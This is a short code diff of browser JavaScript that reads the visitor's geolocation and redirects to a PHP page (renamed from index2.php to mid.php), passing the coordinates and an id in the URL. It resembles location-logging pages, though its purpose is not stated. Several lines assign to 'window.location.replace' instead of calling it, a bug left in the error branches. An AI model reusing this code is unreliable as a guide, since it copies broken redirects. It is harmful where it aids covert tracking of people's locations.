@@ -13,9 +13,9 @@
                 const longitude = position.coords.longitude;
                 console.log(latitude + ',' + longitude);
                 console.log(id);
-                str = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id
+                str = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id
                 console.log(str);
-                window.location.replace = str;
+                window.location = str;
 
             }
 
@@ -24,13 +24,13 @@
 
                 const latitude = 'error';
                 const longitude = 'unable to retrieve the location';
-                window.location.replace = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
+                window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
 
             }
         } else {
             const latitude = 'error';
             const longitude = 'unable to retrieve the location';
-            window.location.replace = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
+            window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
 
 
         }
